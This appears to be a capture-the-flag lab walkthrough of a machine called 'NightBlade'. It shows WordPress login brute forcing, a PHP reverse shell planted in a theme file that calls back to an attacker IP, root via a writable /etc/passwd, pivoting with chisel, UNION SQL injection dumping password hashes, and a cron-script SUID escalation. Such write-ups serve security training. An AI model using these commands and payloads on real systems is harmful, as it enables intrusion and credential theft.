
## Enumeration

We start by enumerating the ports on the target machine using **scapot**, a port scanning tool built in Rust, available on my GitHub repository:

```bash
scapot -t 172.18.0.2 -m top -b
```

<img src="/budahacksecurity/uploads/md_images/nightblade/ng.png" style="max-width:100%; border-radius:8px;">

The result shows that only port **80/TCP** is open, which is being used by the **Apache HTTP Server**.

Next, we use **Nmap** to perform a more thorough enumeration of port 80 and gather additional information about the service version and potential vulnerabilities:

```bash
nmap -p80 -Pn -n -sVC --min-rate 5000 -sS 172.18.0.2 -vvv

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
| /wp/wp-admin/
|_4c334d7a5933497a6445417662476c7a644335306558513d0a
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: NightBlade Gaming \xE2\x80\x94 Terminal
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
MAC Address: 3E:7A:10:9F:B9:29 (Unknown)
```

| Flag | Description |
|---|---|
| `-p80` | Scan only port 80 |
| `-Pn` | Skip host discovery (no ping) |
| `-n` | No DNS resolution |
| `-sVC` | Detect service version and run default scripts |
| `--min-rate 5000` | Send at least 5000 packets per second |
| `-sS` | SYN scan (stealth) |
| `-vvv` | Maximum verbosity |

The result reveals relevant information: the page title is **NightBlade Gaming — Terminal**. The `robots.txt` file exposes two entries: `/wp/wp-admin/`, which confirms the presence of a **WordPress** installation at the `/wp` path, and the string `4c334d7a5933497a6445417662476c7a644335306558513d0a`, which appears to be encoded, possibly in **hexadecimal**. We proceed to review the web server for more information.

<img src="/budahacksecurity/uploads/md_images/nightblade/ng3.png" style="max-width:100%; border-radius:8px;">

When interacting with the web terminal page, we find a hint: **[ERRNO 13] Permission denied — Hint: check the server rules, and remember not everything is in plain text**. This confirms that there is encoded content.

We proceed to enumerate the web server's directories using **ffuf**:

```bash
ffuf -ic -c -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt:FUZZ -u http://172.18.0.2/FUZZ -e .txt .php .html .py .env .db
```

Output:

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://172.18.0.2/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt
 :: Extensions       : .txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 9733, Words: 2364, Lines: 153, Duration: 1ms]
wp                      [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 0ms]
robots.txt              [Status: 200, Size: 99, Words: 4, Lines: 4, Duration: 0ms]
```

The results only confirm what we had already discovered: the `robots.txt` file and the `/wp` path. No additional directories or files of interest were found.

---

## Decoding the Hexadecimal String

Returning to the string found during the Nmap scan, we proceed to analyze it. We confirm it uses **double encoding**: first in **hexadecimal**, then in **Base64**. We decode it as follows:

```bash
# First, decode the hexadecimal
echo "4c334d7a5933497a6445417662476c7a644335306558513d0a" | xxd -r -p

# Then decode the resulting Base64
echo "4c334d7a5933497a6445417662476c7a644335306558513d0a" | xxd -r -p | base64 -d
```

<img src="/budahacksecurity/uploads/md_images/nightblade/ng4.png" style="max-width:100%; border-radius:8px;">

We download the file to our machine using **curl**:

```bash
curl -LO http://172.18.0.2/s3cr3t@/list.txt
```

| Flag | Description |
|---|---|
| `-L` | Follow redirects |
| `-O` | Save the file with its original name |

We verify the file contents to confirm it is a wordlist:

```bash
cat list.txt | tail -5
```

```
crypt
relic
sigil
glyph
rune
```

We confirm that the file is a **custom wordlist** that we will use later to perform a brute force attack.

---

## WordPress Enumeration

Before using WPScan, we enumerate the blog author directly from the browser by visiting `http://172.18.0.2/wp/?author=1`, which reveals that the author of the posts is **krav0**. We now have a valid username to use in a brute force attack.

<img src="/budahacksecurity/uploads/md_images/nightblade/ng5.png" style="max-width:100%; border-radius:8px;">

We proceed to confirm the user and gather more information with **WPScan**:

```bash
wpscan --url http://172.18.0.2/wp --enumerate u

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[i] User(s) Identified:
[+] krav0
```

WPScan confirms the finding:

- Identified user: **krav0**

With the username `krav0` and the custom wordlist `list.txt` downloaded earlier, we proceed to perform a brute force attack against the WordPress login panel.

**ForceWeb**

```bash
forceweb -u http://172.18.0.2/wp/wp-login.php -w list.txt --usuario krav0 -f "The password you entered for the username" -p log -P pwd
```

<img src="/budahacksecurity/uploads/md_images/nightblade/ng6.png" style="max-width:100%; border-radius:8px;">

> We perform the brute force attack against the WordPress login panel using **forceweb**, a web form brute force tool built in Rust, developed by me and available on my GitHub repository.

Using the previously enumerated user `krav0` and the custom wordlist `list.txt` obtained from the machine, we retrieve the credentials:

- **Username:** `krav0`
- **Password:** `voidwalker`

**Hydra**

```bash
hydra -l krav0 -P list.txt 172.18.0.2 http-post-form "/wp/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username"
```

```bash
[80][http-post-form] host: 172.18.0.2   login: krav0   password: voidwalker
```

---

## Exploitation

Once logged into the WordPress admin panel, we navigate to **Appearance → Theme Editor** and locate the `404.php` file.

We replace its content with a PHP reverse shell from **pentestmonkey**, available at: `https://github.com/pentestmonkey/php-reverse-shell`

Before saving, we edit the connection parameters inside the script:

```php
$ip = '172.17.0.1';   // Our attacker IP
$port = 1234;
```

We update the file by clicking **"Update File"**.

<img src="/budahacksecurity/uploads/md_images/nightblade/ng7.png" style="max-width:100%; border-radius:8px;">

Next, we set up a listener with `rustcat`:

```bash
rustcat -lp 1234
```

To force WordPress to load the `404.php` file, we trigger a page-not-found error by accessing an invalid URL:

```
http://172.17.0.2/wp/?author=999999
```

This automatically redirects to the `404.php` template, executing our reverse shell.

We receive the connection on our listener:

<img src="/budahacksecurity/uploads/md_images/nightblade/ng8.png" style="max-width:100%; border-radius:8px;">

---

## Post-Exploitation — Privilege Escalation Enumeration

With access to the server, we begin enumerating the system in search of privilege escalation vectors.

```
(rustcat) www-data@dbb759746506:/tmp$ ./MaxPrivilege.sh

███╗   ███╗ █████╗ ██╗  ██╗
████╗ ████║██╔══██╗╚██╗██╔╝
██╔████╔██║███████║ ╚███╔╝
██║╚██╔╝██║██╔══██║ ██╔██╗
██║ ╚═╝ ██║██║  ██║██╔╝ ██╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝

██████╗ ██████╗ ██╗██╗   ██╗██╗██╗     ███████╗ ██████╗ ███████╗
██╔══██╗██╔══██╗██║██║   ██║██║██║     ██╔════╝██╔════╝ ██╔════╝
██████╔╝██████╔╝██║██║   ██║██║██║     █████╗  ██║  ███╗█████╗
██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██║██║     ██╔══╝  ██║   ██║██╔══╝
██║     ██║  ██║██║ ╚████╔╝ ██║███████╗███████╗╚██████╔╝███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝

  ══════════════════════════════════════════════════════════
        Privilege Escalation & Enumeration Framework
  ══════════════════════════════════════════════════════════

  Author  :  Buda-sys
  Version :  1.0
  Host    :  dbb759746506
  User    :  www-data
  Date    :  2026-03-17 14:19:41

  ══════════════════════════════════════════════════════════


   +------------------------------------+
   |          MaxPriv - Menu            |
   +------------------------------------+
   [1] Full Scan
   [2] Scan by category
   [3] View risk score
   [4] Generate Report
   [5] Exit

   +-------------------------------------+

  MaxPriv>> 2

 +------------------------------------------+
  [LOW]    [a] Config file permissions
  [LOW]    [b] Environment variables
  [MED]    [c] System cronjobs
  [MED]    [d] Running services
  [HIGHT]  [e] SUID / SGID binaries
  [HIGHT]  [f] Capabilities
  [CRIT]   [g] Sudo without password
  [CRITIC] [h] Outdated kernel
           [0] Back
 +-------------------------------------------+

  MaxPriv>> a

  [*] Checking file permissions...
  [OK]   [v] /etc/sudoers -> no access
  [CRIT] [x] /etc/passwd -> WRITABLE >> possible escalation!
  [OK]   [v] /etc/crontab -> no access
  [OK]   [v] /etc/ssh/sshd_config -> no access
  [OK]   [v] /root/.ssh/id_rsa -> no access
  [OK]   [v] /etc/cron.d/ -> no access
  [OK]   [v] /root/.bash_history -> no access
  [LOW]  [+] /etc/environment -> readable
  [LOW]  [+] /etc/hosts -> readable
  [LOW]  [+] /etc/profile -> readable
  [LOW]  [+] /etc/bash.bashrc -> readable
  [LOW]  [+] /etc/hostname -> readable
```

When checking the permissions of system configuration files, the tool detects that **/etc/passwd** is writable by `www-data`, meaning it has **666** permissions. We confirm this manually: the file allows read and write access for any system user. This lets us add a new user with UID 0 (root) directly to the file, gaining root access without needing to know the current root password.

```bash
(rustcat) www-data@001988e20188:/$ ls -la /etc/passwd

-rw-rw-rw- 1 root root 1532 Mar 16 21:12 /etc/passwd
```

---

## Exploitation — /etc/passwd Privilege Escalation

In Linux, `/etc/passwd` supports password hashes in its second field for historical compatibility reasons. If that field contains a valid hash, the system uses it for authentication. This allows us to add a user with **UID 0** (root) and a password we control.

**Generate the hash with OpenSSL:**

```bash
/tmp$ openssl passwd -1 -salt hola hack

$1$hola$he..bSODp9EHID0Yxn8Uv0
```

**Insert the user into /etc/passwd:**

```bash
echo 'user1:$1$hola$he..bSODp9EHID0Yxn8Uv0:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Verify the entry is correct:**

```bash
grep user1 /etc/passwd

# user1:HASH:0:0:root:/root:/bin/bash
```

**Authenticate as the new user:**

<img src="/budahacksecurity/uploads/md_images/nightblade/ng9.png" style="max-width:100%; border-radius:8px;">

| Field | Value | Description |
|---|---|---|
| `user1` | username | Created user |
| `$1$15jsEjCR$...` | MD5 hash | Password `hola123` |
| `0` | UID | Equivalent to root |
| `0` | GID | Root group |
| `root` | comment | Informational |
| `/root` | home | Root's home directory |
| `/bin/bash` | shell | Interactive shell |

The system reads `/etc/passwd` line by line and, upon finding UID 0, grants root privileges regardless of the username.

---

## Internal Machine

We observe that the compromised machine is connected to another internal network segment that we cannot reach directly.

```
root@dbb759746506:/tmp# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 9a:d8:eb:92:45:38  txqueuelen 0  (Ethernet)
        ...

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.2  netmask 255.255.254.0  broadcast 10.10.11.255
        ether c2:76:67:88:cd:e1  txqueuelen 0  (Ethernet)
        ...

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        ...
```

We enumerate active hosts:

```bash
root@7948c0ea3a6e:/# for i in $(seq 1 254); do ping -c1 -W1 10.10.10.$i &>/dev/null && echo "[+] Active host -> 10.10.10.$i" & done 2>/dev/null; wait 2>/dev/null
```

```
[+] Active host -> 10.10.10.3
[+] Active host -> 10.10.10.2
```

We find host **10.10.10.3**.

---

## Pivoting with Chisel

We will use Chisel to make the compromised machine act as a pivot host.

**Victim machine:**

```bash
root@dbb759746506:/tmp# ./chisel server -v -p 4444 --socks5
2026/03/17 15:00:20 server: Fingerprint s4pME7EeZVxudqIMETAdfLuQCQ7iTdFtGmYeIbhkJtI=
2026/03/17 15:00:20 server: Listening on http://0.0.0.0:4444
```

**Attacker machine:**

```bash
./chisel client -v 172.17.0.2:4444 socks
2026/03/17 15:01:06 client: Connecting to ws://172.17.0.2:4444
2026/03/17 15:01:06 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2026/03/17 15:01:06 client: tun: Bound proxies
2026/03/17 15:01:06 client: Handshaking...
2026/03/17 15:01:06 client: Sending config
2026/03/17 15:01:06 client: Connected (Latency 337.969µs)
2026/03/17 15:01:06 client: tun: SSH connected
```

The SSH tunnel is active and we are connected to the internal segment. We will use Nmap to enumerate the active hosts.

First, we edit **/etc/proxychains.conf**:

```
tail -f /etc/proxychains.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
#socks4     127.0.0.1 9050
socks5 127.0.0.1 1080
```

With proxychains configured, we enumerate the ports on the internal machine:

```bash
proxychains scapot -t 10.10.10.3 -m top -b
```

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17

[+] Valid IP address -> 10.10.10.3
=== Scanning Top 90 ports ===

[+] Port 22     | SSH  | SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
[+] Port 80     | HTTP | Apache/2.4.52 (Ubuntu)

═══════════════════════════════════════════════════
 Scan completed | 2 open port(s)
═══════════════════════════════════════════════════
  ► 22  │ SSH  │ SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
  ► 80  │ HTTP │ Apache/2.4.52 (Ubuntu)
═══════════════════════════════════════════════════
 Detected OS │ Linux/Unix
═══════════════════════════════════════════════════
```

We have ports 80 and 22 open. We use Nmap NSE scripts to gather more information:

```bash
proxychains nmap -Pn -sT -T4 -p22,80 -sCV 10.10.10.3
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ee:f6:33:7f:c0:d9:1c:5e:d0:e1:70:12:05:07:cc:fb (ECDSA)
|_  256 fc:5e:28:da:c7:16:cc:27:60:db:8e:6a:c0:8b:96:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

No additional relevant information was found.

<img src="/budahacksecurity/uploads/md_images/nightblade/ng10.png" style="max-width:100%; border-radius:8px;">

> You can configure FoxyProxy or browser proxies to access the internal network, or do it from the terminal with **proxychains firefox 10.10.10.3**.

Port 80 displays the default Apache2 page.

We enumerate accessible directories:

```
───────────────────────────────────────────────────
  Scan completed in 3s — 1 result(s)

  URL                                             CODE     SIZE
  ────────────────────────────────────────────────────────────
  http://10.10.10.3/index.php                      200     6573B
```

We find an `index.php`.

<img src="/budahacksecurity/uploads/md_images/nightblade/ng11.png" style="max-width:100%; border-radius:8px;">

We observe that the web application is connected to an internal database.

<img src="/budahacksecurity/uploads/md_images/nightblade/ng12.png" style="max-width:100%; border-radius:8px;">

---

## UNION-Based SQL Injection

Since the web application uses a database, we proceed to test for UNION-based SQL injection:

```
' UNION SELECT 1,2,3,4-- -
```

<img src="/budahacksecurity/uploads/md_images/nightblade/ng13.png" style="max-width:100%; border-radius:8px;">

We confirm that the database returns 4 columns. When trying with 5 columns we get an error, indicating there are no additional columns.

The next step is to enumerate the MySQL server version:

```
' UNION SELECT 1,2,@@version,4-- -
```

Version:

```
8.0.45-0ubuntu0.22.04.1
```

With the version identified, we enumerate the available databases:

```
' UNION SELECT 1,2,schema_name,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

<img src="/budahacksecurity/uploads/md_images/nightblade/ng14.png" style="max-width:100%; border-radius:8px;">

We observe that, in addition to the server's default databases, there is one called **nightblade_internal**. To confirm it is the one used by the web application, we run:

```
' UNION SELECT 1,2,database(),4-- -
```

<img src="/budahacksecurity/uploads/md_images/nightblade/ng15.png" style="max-width:100%; border-radius:8px;">

With the database confirmed, we enumerate its tables:

```
' UNION SELECT 1,2,TABLE_NAME,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='nightblade_internal'-- -
```

<img src="/budahacksecurity/uploads/md_images/nightblade/ng16.png" style="max-width:100%; border-radius:8px;">

We now enumerate the columns to identify which table contains usernames and passwords:

```
' UNION SELECT 1,2,COLUMN_NAME,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='employees'-- -
```

<img src="/budahacksecurity/uploads/md_images/nightblade/ng17.png" style="max-width:100%; border-radius:8px;">

We found the table containing users and their password hashes:

```
' UNION SELECT 1,2,username,password_hash FROM nightblade_internal.employees-- -
```

<img src="/budahacksecurity/uploads/md_images/nightblade/ng18.png" style="max-width:100%; border-radius:8px;">

With the users and their hashes obtained, we use John the Ripper to crack them.

We create the hash list:

<img src="/budahacksecurity/uploads/md_images/nightblade/ng19.png" style="max-width:100%; border-radius:8px;">

**John The Ripper:**

```bash
john --wordlist=/usr/share/dict/rockyou.txt --format=Raw-MD5 hash.txt

dragon           (?)
password123      (?)
voidwalker       (?)
```

With the cracked passwords and obtained usernames, we build our password list and perform a brute force attack:

<img src="/budahacksecurity/uploads/md_images/nightblade/ng20.png" style="max-width:100%; border-radius:8px;">

We connect via SSH:

```bash
proxychains ssh nightblade@10.10.10.3
password: dragon
```

---

## Privilege Escalation

We run **pspy64** to monitor running processes. First, we transfer it from our attacker machine to the internal host:

<img src="/budahacksecurity/uploads/md_images/nightblade/ng21.png" style="max-width:100%; border-radius:8px;">

Once the tool is running, we observe that a `.sh` script is executed as root every minute:

<img src="/budahacksecurity/uploads/md_images/nightblade/ng22png" style="max-width:100%; border-radius:8px;">

We verify the script's permissions:

```bash
nightblade@3f0ae8fcfe9c:/tmp$ ls -la /bin/bash /opt/scripts/check.sh

-rwxr-xr-x 1 root root      1396520 Mar 14  2024 /bin/bash
-rwxrwxr-x 1 root nightblade    160 Mar 10 13:54 /opt/scripts/check.sh
```

The script has write permissions for the `nightblade` group. This is a critical misconfiguration: any system user belonging to the group can overwrite this file and escalate to root.

We append the command **`chmod u+s /bin/bash`** to the script to set the SUID bit on bash:

```bash
echo 'chmod u+s /bin/bash' >> /opt/scripts/check.sh
```

<img src="/budahacksecurity/uploads/md_images/nightblade/ng23.png" style="max-width:100%; border-radius:8px;">

After waiting for the cronjob to execute, we gain root access:

```bash
bash -p
whoami
# root
```